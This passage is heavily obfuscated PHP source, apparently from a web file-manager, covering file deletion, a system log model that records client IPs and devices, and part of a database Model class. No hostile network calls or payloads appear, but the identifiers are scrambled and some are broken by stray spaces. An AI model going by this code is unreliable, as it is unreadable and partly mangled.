$¿µĞº[] = $åÅî³Î‹; $àéÄÌÚé->updateFileEnd($ñ¾ê³‡É[$ÜÍ±Ô¬Ò[32]], $ñ¾ê³‡É[$ÜÍ±Ô¬Ò[89]]); write_log($ÜÍ±Ô¬Ò[2327] . $Ø—®ç‰¢, $ÜÍ±Ô¬Ò[1903]); continue; } $Ï÷ˆ¢ØÒ = array($ÜÍ±Ô¬Ò[550] => $åÅî³Î‹); $¤áÂ×Ü = array($ÜÍ±Ô¬Ò[901] => $²‰ƒï½ª, $ÜÍ±Ô¬Ò[97] => $´Àñ¥©”); Model($ÜÍ±Ô¬Ò[240])->where($Ï÷ˆ¢ØÒ)->save($¤áÂ×Ü); } $«îàÚê = $àéÄÌÚé->task; if (!$ßàõËĞ) { Cache::set($‚ÃØİâó, $«îàÚê); } $àéÄÌÚé->end(); $­œãŒËÖ = array_unique($­œãŒËÖ); $¿µĞº = array_unique($¿µĞº); if (!$ßàõËĞ && ($­œãŒËÖ || $¿µĞº)) { $—”ö¦Ñò = array(); if ($­œãŒËÖ) { $—”ö¦Ñò[] = sprintf(LNG($ÜÍ±Ô¬Ò[2328]), count($­œãŒËÖ)); } if ($¿µĞº) { $—”ö¦Ñò[] = sprintf(LNG($ÜÍ±Ô¬Ò[2329]), count($¿µĞº)); } $—”ö¦Ñò = sprintf(LNG($ÜÍ±Ô¬Ò[2330]), implode($ÜÍ±Ô¬Ò[2331], $—”ö¦Ñò)) . $ÜÍ±Ô¬Ò[2332] . date($ÜÍ±Ô¬Ò[2333]) . $ÜÍ±Ô¬Ò[2334]; if ($¸ç İ»í == $ÜÍ±Ô¬Ò[1940]) { $—”ö¦Ñò .= $ÜÍ±Ô¬Ò[2335] . LNG($ÜÍ±Ô¬Ò[2336]); } $«îàÚê[$ÜÍ±Ô¬Ò[1267]] = $—”ö¦Ñò; Cache::set($‚ÃØİâó, $«îàÚê); unset($Äğúßáì[$ÜÍ±Ô¬Ò[6]]); $ş©Ş¨°í = array($ÜÍ±Ô¬Ò[484] => $±—£±Ä, $ÜÍ±Ô¬Ò[2210] => $ÜÍ±Ô¬Ò[629], $ÜÍ±Ô¬Ò[32] => $Äğúßáì[$ÜÍ±Ô¬Ò[32]], $ÜÍ±Ô¬Ò[1290] => $Äğúßáì); Hook::trigger($ÜÍ±Ô¬Ò[1784], array($ÜÍ±Ô¬Ò[1290] => $ş©Ş¨°í, $ÜÍ±Ô¬Ò[1300] => !0)); show_json($—”ö¦Ñò, !1, 100111); } if ($¸ç İ»í == $ÜÍ±Ô¬Ò[629]) { return !0; } if ($­œãŒËÖ || $¿µĞº) { $²Ğ˜¡èª = array_merge($­œãŒËÖ, $¿µĞº); $²Ğ˜¡èª = array_filter(array_unique($²Ğ˜¡èª)); $this->removeByFileID($²Ğ˜¡èª); } if ($ùô×Õ‡œ) { $ùô×Õ‡œ = array_filter(array_unique($ùô×Õ‡œ)); foreach ($ùô×Õ‡œ as $Ø—®ç‰¢) { $ÎñÅğÙ = IO::has($Ø—®ç‰¢, !0); if (!$ÎñÅğÙ[$ÜÍ±Ô¬Ò[249]] && !$ÎñÅğÙ[$ÜÍ±Ô¬Ò[250]]) { IO::remove($Ø—®ç‰¢); } } } return $this->remove($±—£±Ä); } private function removeByFileID($­Ù·Å‰ = array()) { $ö°¦œ´è =& $_SERVER[ÕŸ²ó÷å]; if (empty($­Ù·Å‰)) { return; } $ãéÚÖõ” = array($ö°¦œ´è[550] => array($ö°¦œ´è[7], $­Ù·Å‰)); $’Æ–ªåÙ = Model($ö°¦œ´è[1421])->where($ãéÚÖõ”)->field($ö°¦œ´è[203])->select(); if (!$’Æ–ªåÙ) { return Model($ö°¦œ´è[553])->remove($­Ù·Å‰); } $’Æ–ªåÙ = array_to_keyvalue($’Æ–ªåÙ, $ö°¦œ´è[12], $ö°¦œ´è[203]); foreach ($’Æ–ªåÙ as $Ë­îù½) { Model($ö°¦œ´è[908])->removeNow($Ë­îù½, !1); } } private function removeShareItems($»”„î—Æ) { $…ëüÍ‹ =& $_SERVER[ÕŸ²ó÷å]; $–»Òíîå = "\x7b\151\157\72{$»”„î—Æ}\175\x2f"; $²ÜâŸÓ = array($…ëüÍ‹[203] => 0, $…ëüÍ‹[1260] => array($…ëüÍ‹[468], "{$–»Òíîå}\x25")); $€´Ğêş¹ = Model($…ëüÍ‹[1951])->where($²ÜâŸÓ)->field($…ëüÍ‹[674])->select(); if (empty($€´Ğêş¹)) { return; } $€¬¥ÀöÔ = array_to_keyvalue($€´Ğêş¹, $…ëüÍ‹[12], $…ëüÍ‹[674]); Model($…ëüÍ‹[673])->remove($€¬¥ÀöÔ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\114\x69\x67\x68\x74\x41\160\160"; public $modelType = "\123\171\163\x74\145\155\117\x70\x74\x69\157\156"; public $field = array("\x6e\141\x6d\x65", "\147\x72\157\165\x70", "\144\145\163\x63", "\x63\157\156\164\145\156\x74"); public function listData($´ÍşÛÁ = false, $ºŒ¯Ô§ş = "\x6d\x6f\144\151\146\x79\124\151\155\x65", $úâ “Û = true) { return parent::listData($´ÍşÛÁ, $ºŒ¯Ô§ş, $úâ “Û); } public function remove($ÒİŞ–å) { $‚º—Ğª = $this->findByName($ÒİŞ–å); if (!$‚º—Ğª) { return !1; } return parent::remove($‚º—Ğª[$_SERVER[ÕŸ²ó÷å][484]]); } public function add($ƒ¥°Ü×î) { if ($this->findByName($ƒ¥°Ü×î[$_SERVER[ÕŸ²ó÷å][32]])) { return !1; } return parent::insert($ƒ¥°Ü×î); } public function update($´ûåªµÅ, $ÄÔ¬ÜêÓ) { $¢Â“ãùÂ =& $_SERVER[ÕŸ²ó÷å]; $Í”Ş‡Û° = $this->findByName($´ûåªµÅ); $Åš’šõ = $this->findByName($ÄÔ¬ÜêÓ[$¢Â“ãùÂ[32]]); if (!$Í”Ş‡Û° || $Åš’šõ && $Åš’šõ[$¢Â“ãùÂ[484]] != $Í”Ş‡Û°[$¢Â“ãùÂ[484]]) { return !1; } return parent::update($Í”Ş‡Û°[$¢Â“ãùÂ[484]], $ÄÔ¬ÜêÓ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\145\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\143\162\x65\x61\x74\x65\124\x69\155\x65", "\164\x69\155\145", "\x69\156\x73\145\162\164", "\x66\x75\156\143\164\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $Ç½‰Ê¢ï =& $_SERVER[ÕŸ²ó÷å]; return array($Ç½‰Ê¢ï[2337] => LNG($Ç½‰Ê¢ï[2338]), $Ç½‰Ê¢ï[2339] => LNG($Ç½‰Ê¢ï[2340]), $Ç½‰Ê¢ï[1914] => LNG($Ç½‰Ê¢ï[2341]), $Ç½‰Ê¢ï[2342] => LNG($Ç½‰Ê¢ï[2343]), $Ç½‰Ê¢ï[2344] => LNG($Ç½‰Ê¢ï[2345]), $Ç½‰Ê¢ï[2346] => LNG($Ç½‰Ê¢ï[2347]), $Ç½‰Ê¢ï[2348] => LNG($Ç½‰Ê¢ï[2349]), $Ç½‰Ê¢ï[1944] => LNG($Ç½‰Ê¢ï[2349]), $Ç½‰Ê¢ï[1945] => LNG($Ç½‰Ê¢ï[2350]), $Ç½‰Ê¢ï[2351] => LNG($Ç½‰Ê¢ï[2352]), $Ç½‰Ê¢ï[2353] => LNG($Ç½‰Ê¢ï[2354]), $Ç½‰Ê¢ï[2355] => LNG($Ç½‰Ê¢ï[2356]), $Ç½‰Ê¢ï[2357] => LNG($Ç½‰Ê¢ï[2358]), $Ç½‰Ê¢ï[1942] => LNG($Ç½‰Ê¢ï[2359]), $Ç½‰Ê¢ï[2360] => LNG($Ç½‰Ê¢ï[2361]), $Ç½‰Ê¢ï[1949] => LNG($Ç½‰Ê¢ï[2362]), $Ç½‰Ê¢ï[2363] => LNG($Ç½‰Ê¢ï[2364]), $Ç½‰Ê¢ï[2365] => LNG($Ç½‰Ê¢ï[2366]), $Ç½‰Ê¢ï[2367] => LNG($Ç½‰Ê¢ï[2368]), $Ç½‰Ê¢ï[2369] => LNG($Ç½‰Ê¢ï[2370]), $Ç½‰Ê¢ï[1952] => LNG($Ç½‰Ê¢ï[2371]), $Ç½‰Ê¢ï[1953] => LNG($Ç½‰Ê¢ï[2372]), $Ç½‰Ê¢ï[2373] => LNG($Ç½‰Ê¢ï[2374]), $Ç½‰Ê¢ï[2375] => LNG($Ç½‰Ê¢ï[2376]), $Ç½‰Ê¢ï[2377] => LNG($Ç½‰Ê¢ï[2378]), $Ç½‰Ê¢ï[1947] => LNG($Ç½‰Ê¢ï[2379]), $Ç½‰Ê¢ï[2380] => LNG($Ç½‰Ê¢ï[2381]), $Ç½‰Ê¢ï[1946] => LNG($Ç½‰Ê¢ï[2382]), $Ç½‰Ê¢ï[2383] => LNG($Ç½‰Ê¢ï[2384]), $Ç½‰Ê¢ï[2385] => LNG($Ç½‰Ê¢ï[2386]), $Ç½‰Ê¢ï[2387] => LNG($Ç½‰Ê¢ï[2386]), $Ç½‰Ê¢ï[2388] => LNG($Ç½‰Ê¢ï[2389]), $Ç½‰Ê¢ï[2390] => LNG($Ç½‰Ê¢ï[2390]), $Ç½‰Ê¢ï[2391] => LNG($Ç½‰Ê¢ï[1918]), $Ç½‰Ê¢ï[2392] => LNG($Ç½‰Ê¢ï[2393]), $Ç½‰Ê¢ï[2394] => LNG($Ç½‰Ê¢ï[2395]), $Ç½‰Ê¢ï[2396] => LNG($Ç½‰Ê¢ï[2397]), $Ç½‰Ê¢ï[2398] => LNG($Ç½‰Ê¢ï[2399]), $Ç½‰Ê¢ï[2400] => LNG($Ç½‰Ê¢ï[2401]), $Ç½‰Ê¢ï[2402] => LNG($Ç½‰Ê¢ï[2402]), $Ç½‰Ê¢ï[2403] => LNG($Ç½‰Ê¢ï[2404]), $Ç½‰Ê¢ï[2405] => LNG($Ç½‰Ê¢ï[2406]), $Ç½‰Ê¢ï[2407] => LNG($Ç½‰Ê¢ï[2408]), $Ç½‰Ê¢ï[2409] => LNG($Ç½‰Ê¢ï[2410]), $Ç½‰Ê¢ï[2411] => LNG($Ç½‰Ê¢ï[2412]), $Ç½‰Ê¢ï[2413] => LNG($Ç½‰Ê¢ï[2414]), $Ç½‰Ê¢ï[222] => LNG($Ç½‰Ê¢ï[222]), $Ç½‰Ê¢ï[223] => LNG($Ç½‰Ê¢ï[2415]), $Ç½‰Ê¢ï[2416] => LNG($Ç½‰Ê¢ï[2416])); } private function typeFile() { $„è Ÿ½¼ =& $_SERVER[ÕŸ²ó÷å]; $®«‹”ÙÎ = array($„è Ÿ½¼[1949] => array($„è Ÿ½¼[1950]), $„è Ÿ½¼[2355] => array($„è Ÿ½¼[2417]), $„è Ÿ½¼[2357] => array($„è Ÿ½¼[2418]), $„è Ÿ½¼[1942] => array($„è Ÿ½¼[1943], $„è Ÿ½¼[2419]), $„è Ÿ½¼[2365] => array(), $„è Ÿ½¼[2367] => array(), $„è Ÿ½¼[2369] => array(), $„è Ÿ½¼[1952] => array($„è Ÿ½¼[1954]), $„è Ÿ½¼[1953] => array($„è Ÿ½¼[1954]), $„è Ÿ½¼[2373] => array($„è Ÿ½¼[2420]), $„è Ÿ½¼[2375] => array($„è Ÿ½¼[2420]), $„è Ÿ½¼[2377] => array($„è Ÿ½¼[2421]), $„è Ÿ½¼[2363] => array($„è Ÿ½¼[2422]), $„è Ÿ½¼[1947] => array($„è Ÿ½¼[2423]), $„è Ÿ½¼[2380] => array($„è Ÿ½¼[2424]), $„è Ÿ½¼[1946] => array($„è Ÿ½¼[1948])); return $®«‹”ÙÎ; } private function typeAll() { $±Ç³‹ƒ =& $_SERVER[ÕŸ²ó÷å]; $¬½²¿© = $this->typeList; $ÏôÉáİ = array_filter($this->typeFile()); foreach ($ÏôÉáİ as $™×ª¤Ñî => $ªªßÆ) { $¬½²¿©[$ªªßÆ[0]] = $¬½²¿©[$™×ª¤Ñî]; } $¬½²¿©[$±Ç³‹ƒ[1954]] = LNG($±Ç³‹ƒ[2425]); $¬½²¿©[$±Ç³‹ƒ[2420]] = LNG($±Ç³‹ƒ[2426]); return $¬½²¿©; } public function addLog($æ³ùä±ñ, $«åª˜ = array()) { $§Şµ´…ø =& $_SERVER[ÕŸ²ó÷å]; if (!isset($this->typeList[$æ³ùä±ñ])) { return; } $ûşòïù² = Session::get($§Şµ´…ø[2113]); if (!$ûşòïù²) { $ûşòïù² = _get($«åª˜, $§Şµ´…ø[1773], 0); } if ($æ³ùä±ñ == $§Şµ´…ø[2392] && is_array($«åª˜[$§Şµ´…ø[2427]]) && !$«åª˜[$§Şµ´…ø[2427]]) { return; } $ºíùŒëØ = get_client_ip(); if (!$«åª˜ || strlen(json_encode($«åª˜)) >= 1024 * 64) { if ($«åª˜ && is_array($«åª˜)) { $«åª˜ = array_intersect_key($«åª˜, array_flip($§Şµ´…ø[484], $§Şµ´…ø[32])); $«åª˜[$§Şµ´…ø[2428]] = $ºíùŒëØ; } else { $«åª˜ = array($§Şµ´…ø[2428] => $ºíùŒëØ); } } else { if (is_array($«åª˜)) { $«åª˜[$§Şµ´…ø[2428]] = $ºíùŒëØ; } else { $«åª˜ = array($§Şµ´…ø[1290] => $«åª˜, $§Şµ´…ø[2428] => $ºíùŒëØ); } } $«åª˜ = array($§Şµ´…ø[1763] => Session::sign(), $§Şµ´…ø[1764] => intval($ûşòïù²), $§Şµ´…ø[33] => $æ³ùä±ñ, $§Şµ´…ø[1766] => json_encode($«åª˜)); parent::add($«åª˜); } public function remove($Ä¼»ùî») { $this->where(array($_SERVER[ÕŸ²ó÷å][502] => $Ä¼»ùî»))->delete(); } private function _makeOrder($Å¹èĞƒÈ = '') { $‡Üşã¾ =& $_SERVER[ÕŸ²ó÷å]; $£çó¤è‘ = $‡Üşã¾[241]; $„´§§Ìà = array($‡Üşã¾[532] => $‡Üşã¾[533], $‡Üşã¾[534] => $‡Üşã¾[535]); $™¾¢óû = Input::get($‡Üşã¾[540], $‡Üşã¾[7], $‡Üşã¾[2149], array($‡Üşã¾[2067], $‡Üşã¾[534])); $™¾¢óû = $„´§§Ìà[$™¾¢óû]; $Å¹èĞƒÈ = $Å¹èĞƒÈ . "{$£çó¤è‘}\x20{$™¾¢óû}"; return $this->order($Å¹èĞƒÈ); } public function get($‚÷¢Íó = '') { $äº†ª— =& $_SERVER[ÕŸ²ó÷å]; if (!$‚÷¢Íó) { show_json(array()); } $õ¦²‹ßï = array(); if ($‚÷¢Íó[$äº†ª—[1773]]) { $õ¦²‹ßï[$äº†ª—[1773]] = $‚÷¢Íó[$äº†ª—[1773]]; } if (isset($‚÷¢Íó[$äº†ª—[844]])) { $ùÅşŠ¿ = $‚÷¢Íó[$äº†ª—[844]]; $²ŒŒÂş² = isset($‚÷¢Íó[$äº†ª—[845]]) ? $‚÷¢Íó[$äº†ª—[845]] : time(); $õ¦²‹ßï[$äº†ª—[241]] = array($äº†ª—[418], array($ùÅşŠ¿, $²ŒŒÂş²)); } if ($‚÷¢Íó[$äº†ª—[33]]) { $›çĞúâ = explode($äº†ª—[50], $‚÷¢Íó[$äº†ª—[33]]); $š°İÂÂ = $this->typeFile(); $ŞØì®ë‰ = array(); foreach ($›çĞúâ as $Èñú») { $ŞØì®ë‰[] = $Èñú»; if (isset($š°İÂÂ[$Èñú»])) { $ŞØì®ë‰ = array_merge($ŞØì®ë‰, $š°İÂÂ[$Èñú»]); } } $ŞØì®ë‰ = array_unique($ŞØì®ë‰); if ($ŞØì®ë‰) { $õ¦²‹ßï[$äº†ª—[33]] = array($äº†ª—[7], $ŞØì®ë‰); } } else { $õ¦²‹ßï[$äº†ª—[33]] = array($äº†ª—[2429], $äº†ª—[2430]); } if (!empty($‚÷¢Íó[$äº†ª—[2428]])) { $õ¦²‹ßï[$äº†ª—[535]] = array($äº†ª—[468], "\45{$‚÷¢Íó[$äº†ª—[2428]]}\45"); } $¨ãË¤ã = $this->_makeOrder()->where($õ¦²‹ßï)->selectPage(); if (empty($¨ãË¤ã[$äº†ª—[454]])) { show_json(array(), !0, $¨ãË¤ã[$äº†ª—[451]]); } $¨ãË¤ã[$äº†ª—[454]] = $this->logList($¨ãË¤ã[$äº†ª—[454]]); return $¨ãË¤ã; } private function ipAddress(&$ÙõÀÅæ±) { $ƒëùÛî³ =& $_SERVER[ÕŸ²ó÷å]; if (!empty($ÙõÀÅæ±[$ƒëùÛî³[2428]])) { $«±ì•ô = IpLocation::get($ÙõÀÅæ±[$ƒëùÛî³[2428]]); } else { $«±ì•ô = LNG($ƒëùÛî³[2431]); } $ÙõÀÅæ±[$ƒëùÛî³[2432]] = $«±ì•ô; } private function descZipDownload($‚ŸÇ³, &$‚Œ¦Íôà) { $òÅı†’› =& $_SERVER[ÕŸ²ó÷å]; if (!isset($‚ŸÇ³[$òÅı†’›[2433]])) { return; } $ÍÏ«‰’± = json_decode($‚ŸÇ³[$òÅı†’›[2433]], !0); foreach ($ÍÏ«‰’± as $¬×©ş½) { try { $òÛí ›æ = IO::infoFullSimple($¬×©ş½[$òÅı†’›[97]]); } catch (Exception $Ï™Ø€™) { continue; } $‚ŸÇ³[$òÅı†’›[97]] = $¬×©ş½[$òÅı†’›[97]]; $‚Œ¦Íôà[] = $‚ŸÇ³[$òÅı†’›[203]] = $òÛí ›æ[$òÅı†’›[203]]; $‚Œ¦Íôà[] = $‚ŸÇ³[$òÅı†’›[2205]] = $òÛí ›æ[$òÅı†’›[202]]; break; } return $‚ŸÇ³; } private function getSourceList(&$´«Ö‚Øş) { $ÍÒ€ì« =& $_SERVER[ÕŸ²ó÷å]; $Ñ›Ê®éî = array(); foreach ($´«Ö‚Øş as $ŒÚÔÕ×› => $ê—àèãÕ) { $³›¤ŒÓˆ = json_decode($ê—àèãÕ[$ÍÒ€ì«[535]], !0); if ($ê—àèãÕ[$ÍÒ€ì«[33]] == $ÍÒ€ì«[1945]) { $³›¤ŒÓˆ = $this->descZipDownload($³›¤ŒÓˆ, $Ñ›Ê®éî); $´«Ö‚Øş[$ŒÚÔÕ×›][$ÍÒ€ì«[535]] = json_encode($³›¤ŒÓˆ); continue; } if (strpos($ê—àèãÕ[$ÍÒ€ì«[33]], $ÍÒ€ì«[2207]) !== 0) { if (!isset($³›¤ŒÓˆ[$ÍÒ€ì«[97]]) || strpos($ê—àèãÕ[$ÍÒ€ì«[33]], $ÍÒ€ì«[2434]) !== 0) { continue; } try { $Â¬©ªŞ = IO::infoFullSimple($³›¤ŒÓˆ[$ÍÒ€ì«[97]]); } catch (Exception $ÁãòøÂ«) { continue; } $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[203]] = $Â¬©ªŞ[$ÍÒ€ì«[203]]; $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[2205]] = $Â¬©ªŞ[$ÍÒ€ì«[202]]; $´«Ö‚Øş[$ŒÚÔÕ×›][$ÍÒ€ì«[535]] = json_encode($³›¤ŒÓˆ); continue; } $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[203]]; $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[2205]]; if ($³›¤ŒÓˆ[$ÍÒ€ì«[33]] == $ÍÒ€ì«[629]) { $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[535]][$ÍÒ€ì«[1244]]; $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[535]][$ÍÒ€ì«[1245]]; } if ($³›¤ŒÓˆ[$ÍÒ€ì«[33]] == $ÍÒ€ì«[2216]) { $Ñ›Ê®éî[] = $³›¤ŒÓˆ[$ÍÒ€ì«[535]][$ÍÒ€ì«[203]]; } } if (!$Ñ›Ê®éî) { return array(); } return Model($ÍÒ€ì«[908])->sourceListInfo($Ñ›Ê®éî, !0); } private function logList($«´‰ëÀÕ) { $ê‘ç”Ô’ =& $_SERVER[ÕŸ²ó÷å]; $õ€‡µˆ¢ = array_to_keyvalue($«´‰ëÀÕ, $ê‘ç”Ô’[12], $ê‘ç”Ô’[1773]); $˜«ø³í¯ = Model($ê‘ç”Ô’[607])->userListInfo(array_unique($õ€‡µˆ¢)); $ë€éöÒ‹ = $this->getSourceList($«´‰ëÀÕ); $ŠÂÌöºñ = $this->typeAll(); $àı¦…Œ® = array(); $¯¹å¶‰Õ = array(); foreach ($«´‰ëÀÕ as $¶Òš³– => $“ÄíÅ¡) { $¢Õ¥Ò†é = $“ÄíÅ¡[$ê‘ç”Ô’[33]]; $ı‡§ÄÀå = isset($˜«ø³í¯[$“ÄíÅ¡[$ê‘ç”Ô’[1773]]]) ? $˜«ø³í¯[$“ÄíÅ¡[$ê‘ç”Ô’[1773]]] : !1; $ÃĞŞ…ı» = strpos($¢Õ¥Ò†é, $ê‘ç”Ô’[2435]) === 0 ? LNG($ê‘ç”Ô’[2436]) : LNG($ê‘ç”Ô’[2431]); $“ÄíÅ¡[$ê‘ç”Ô’[32]] = isset($ı‡§ÄÀå[$ê‘ç”Ô’[32]]) ? $ı‡§ÄÀå[$ê‘ç”Ô’[32]] : LNG($ê‘ç”Ô’[2431]); $“ÄíÅ¡[$ê‘ç”Ô’[2265]] = isset($ı‡§ÄÀå[$ê‘ç”Ô’[2265]]) ? $ı‡§ÄÀå[$ê‘ç”Ô’[2265]] : $ê‘ç”Ô’[12]; $“ÄíÅ¡[$ê‘ç”Ô’[1662]] = isset($ŠÂÌöºñ[$¢Õ¥Ò†é]) ? $ŠÂÌöºñ[$¢Õ¥Ò†é] : $ÃĞŞ…ı»; $“ÄíÅ¡[$ê‘ç”Ô’[2148]] = $ı‡§ÄÀå; $· ÑÛ—Æ = json_decode($“ÄíÅ¡[$ê‘ç”Ô’[535]], !0); $“ÄíÅ¡[$ê‘ç”Ô’[2428]] = isset($· ÑÛ—Æ[$ê‘ç”Ô’[2428]]) ? $· ÑÛ—Æ[$ê‘ç”Ô’[2428]] : $ê‘ç”Ô’[12]; $“ÄíÅ¡[$ê‘ç”Ô’[2432]] = IpLocation::get($“ÄíÅ¡[$ê‘ç”Ô’[2428]]); if (strpos($¢Õ¥Ò†é, $ê‘ç”Ô’[2207]) === 0 || isset($· ÑÛ—Æ[$ê‘ç”Ô’[2205]])) { $· ÑÛ—Æ[$ê‘ç”Ô’[100]] = $ë€éöÒ‹[$· ÑÛ—Æ[$ê‘ç”Ô’[203]]]; $· ÑÛ—Æ[$ê‘ç”Ô’[2221]] = $ë€éöÒ‹[$· ÑÛ—Æ[$ê‘ç”Ô’[2205]]]; if ($· ÑÛ—Æ[$ê‘ç”Ô’[33]] == $ê‘ç”Ô’[629]) { $· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[1244]] = $ë€éöÒ‹[$· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[1244]]]; $· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[1245]] = $ë€éöÒ‹[$· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[1245]]]; } if ($· ÑÛ—Æ[$ê‘ç”Ô’[33]] == $ê‘ç”Ô’[2216]) { $· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[203]] = $ë€éöÒ‹[$· ÑÛ—Æ[$ê‘ç”Ô’[535]][$ê‘ç”Ô’[203]]]; } if ($· ÑÛ—Æ[$ê‘ç”Ô’[33]] == $ê‘ç”Ô’[1940]) { $· ÑÛ—Æ[$ê‘ç”Ô’[2221]] = $· ÑÛ—Æ[$ê‘ç”Ô’[100]]; $· ÑÛ—Æ[$ê‘ç”Ô’[2205]] = $· ÑÛ—Æ[$ê‘ç”Ô’[2221]][$ê‘ç”Ô’[203]]; $· ÑÛ—Æ[$ê‘ç”Ô’[100]] = !1; $· ÑÛ—Æ[$ê‘ç”Ô’[203]] = $ê‘ç”Ô’[12]; } $…óŒîÚ¥ = array($ê‘ç”Ô’[1940], $ê‘ç”Ô’[2203]); if (!in_array($· ÑÛ—Æ[$ê‘ç”Ô’[33]], $…óŒîÚ¥)) { if ($· ÑÛ—Æ[$ê‘ç”Ô’[100]] && $· ÑÛ—Æ[$ê‘ç”Ô’[100]][$ê‘ç”Ô’[200]] == $ê‘ç”Ô’[201]) { $¯¹å¶‰Õ[] = $“ÄíÅ¡[$ê‘ç”Ô’[484]]; unset($«´‰ëÀÕ[$¶Òš³–]); continue; } if ($· ÑÛ—Æ[$ê‘ç”Ô’[2221]] && $· ÑÛ—Æ[$ê‘ç”Ô’[2221]][$ê‘ç”Ô’[200]] == $ê‘ç”Ô’[201]) { $¯¹å¶‰Õ[] = $“ÄíÅ¡[$ê‘ç”Ô’[484]]; unset($«´‰ëÀÕ[$¶Òš³–]); continue; } } } $“ÄíÅ¡[$ê‘ç”Ô’[535]] = $· ÑÛ—Æ; unset($“ÄíÅ¡[$ê‘ç”Ô’[2437]]); $àı¦…Œ®[] = $“ÄíÅ¡; } $this->clearSystemPathLog($¯¹å¶‰Õ); return $àı¦…Œ®; } private function clearSystemPathLog($ö¿¯«ß) { $èÄó†¢§ =& $_SERVER[ÕŸ²ó÷å]; if (count($ö¿¯«ß) == 0) { return; } $¥Í©âıÑ = array($èÄó†¢§[484] => array($èÄó†¢§[7], array_unique($ö¿¯«ß))); $this->where($¥Í©âıÑ)->delete(); } public function deviceList($ñÆÑ²œŠ, $ÕßıâÂŞ = 0) { $û­¹¡ôº =& $_SERVER[ÕŸ²ó÷å]; $«æ‘î² = array($û­¹¡ôº[1773] => $ñÆÑ²œŠ, $û­¹¡ôº[241] => array($û­¹¡ôº[1095], $ÕßıâÂŞ), $û­¹¡ôº[33] => $û­¹¡ôº[1914]); $«ò”ÙÅÀ = array(); $˜ìõşïì = $this->field($û­¹¡ôº[2438])->where($«æ‘î²)->order($û­¹¡ôº[2219])->limit(50)->select(); foreach ($˜ìõşïì as $šÏ¾ƒ¡Î => $òãÌÜ€) { if ($šÏ¾ƒ¡Î > 0 && abs($òãÌÜ€[$û­¹¡ôº[241]] - $˜ìõşïì[$šÏ¾ƒ¡Î - 1][$û­¹¡ôº[241]]) < 5) { continue; } $î­º™´ø = json_decode($òãÌÜ€[$û­¹¡ôº[535]], !0); $òãÌÜ€[$û­¹¡ôº[2428]] = isset($î­º™´ø[$û­¹¡ôº[2428]]) ? $î­º™´ø[$û­¹¡ôº[2428]] : $û­¹¡ôº[12]; unset($î­º™´ø[$û­¹¡ôº[2428]]); $­Îã¨ñ¬ = $this->deviceType($î­º™´ø[$û­¹¡ôº[2208]]); if (isset($«ò”ÙÅÀ[$­Îã¨ñ¬])) { continue; } $òãÌÜ€[$û­¹¡ôº[2432]] = IpLocation::get($òãÌÜ€[$û­¹¡ôº[2428]]); $òãÌÜ€[$û­¹¡ôº[535]] = $î­º™´ø; $«ò”ÙÅÀ[$­Îã¨ñ¬] = $òãÌÜ€; } return array_values($«ò”ÙÅÀ); } public function deviceType($£š¯Âºô) { return $£š¯Âºô; } } goto EËò—¸‘é; C“ÄƒäÜİ¼: define($_SERVER[ÕŸ²ó÷å][328], 0); define($_SERVER[ÕŸ²ó÷å][329], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\x6f\162\x64\145\162", "\x61\154\151\x61\163", "\150\x61\166\151\x6e\x67", "\x67\162\157\165\x70", "\154\x6f\x63\153", "\144\151\x73\x74\151\x6e\143\x74", "\x61\165\164\157", "\x66\x69\x6c\164\145\162", "\166\141\154\x69\144\141\x74\x65", "\x72\x65\163\x75\x6c\x74", "\x62\151\x6e\x64", "\x74\x6f\x6b\x65\x6e"); public function __construct($ƒı¦ßÈ‰ = '', $éÀÓ¦¼« = '', $â´Ó¾šÒ = '') { $ªİ‰¯Ó =& $_SERVER[ÕŸ²ó÷å]; $this->_initialize(); if (!empty($ƒı¦ßÈ‰)) { if (strpos($ƒı¦ßÈ‰, $ªİ‰¯Ó[10])) { list($this->dbName, $this->name) = explode($ªİ‰¯Ó[10], $ƒı¦ßÈ‰); } else { $this->name = $ƒı¦ßÈ‰; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($éÀÓ¦¼«)) { $this->tablePrefix = $ªİ‰¯Ó[12]; } elseif ($ªİ‰¯Ó[12] != $éÀÓ¦¼«) { $this->tablePrefix = $éÀÓ¦¼«; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ªİ‰¯Ó[330]); } $this->db(0, empty($this->connection) ? $â´Ó¾šÒ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ÔŸáúİ¬ =& $_SERVER[ÕŸ²ó÷å]; if (empty($this->fields)) { if (think_config($ÔŸáúİ¬[331])) { $¹´–ùëã = $this->dbName ? $this->dbName : think_config($ÔŸáúİ¬[332]); $©ë—ƒ¹— = think_var_cache($ÔŸáúİ¬[333] . strtolower(get_path_this($¹´–ùëã) . $ÔŸáúİ¬[10] . $this->name)); if ($©ë—ƒ¹—) { $´Öìœ˜ = think_config($ÔŸáúİ¬[334]); if (empty($´Öìœ˜) || $©ë—ƒ¹—[$ÔŸáúİ¬[335]] == $´Öìœ˜) { $this->fields = $©ë—ƒ¹—; return; 